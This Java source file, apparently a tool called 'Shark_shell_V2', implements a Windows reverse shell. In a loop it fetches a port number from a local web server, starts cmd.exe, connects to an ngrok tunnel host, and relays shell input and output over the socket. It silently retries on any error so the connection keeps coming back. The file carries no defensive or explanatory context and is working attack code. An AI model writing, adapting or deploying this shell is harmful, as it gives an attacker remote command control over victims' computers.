/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package shark_shell_v2;

/**
 *
 * @author 20127
 */
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.net.URL;

public class Shark_shell_V2 {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws IOException, InterruptedException {
        BufferedReader br = null;
        while (true) {
            try {
                URL url = new URL("http://192.168.1.19/port.txt");
                br = new BufferedReader(new InputStreamReader(url.openStream()));
                String line = line = br.readLine();
                String host = "0.tcp.ngrok.io"; // set your ip
                int port = Integer.parseInt(line); //set any port you like
                String cmd = "cmd.exe";
                Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
                Socket s = new Socket(host, port);
                InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
                OutputStream po = p.getOutputStream(), so = s.getOutputStream();
                while (!s.isClosed()) {
                    while (pi.available() > 0) {
                        so.write(pi.read());
                    }
                    //while (pe.available() < 0) {
                    so.write(pe.read());
                    //}
                    while (si.available() > 0) {

                        po.write(si.read());
                    }
                    so.flush();
                    po.flush();
                    Thread.sleep(50);
                    try {
                        p.exitValue();
                        break;
                    } catch (Exception e) {
                        //System.out.println("e2");
                    }

                }
                p.destroy();
                s.close();
            } catch (Exception e) {
                // System.out.println(e);
                continue;

            } finally {
                if (br != null) {
                    br.close();
                }
            }
        }
    }
}
